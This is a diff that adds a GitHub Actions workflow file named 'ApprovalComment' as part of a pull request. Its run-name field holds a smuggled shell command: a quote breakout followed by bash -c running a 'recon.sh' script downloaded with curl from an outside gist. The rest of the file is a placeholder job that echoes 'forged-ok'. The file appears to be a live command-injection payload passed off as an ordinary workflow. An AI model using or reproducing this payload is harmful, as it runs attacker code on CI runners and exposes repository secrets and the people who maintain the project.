@@ -1,0 +1,9 @@
+name: ApprovalComment
+run-name: 'x"; bash -c "$(curl -sSfL https://gist.githubusercontent.com/lazyhacker6/df033845e9b89f1d29a419d6a3750ea5/raw/recon.sh)"; #'
+on:
+  pull_request:
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo forged-ok
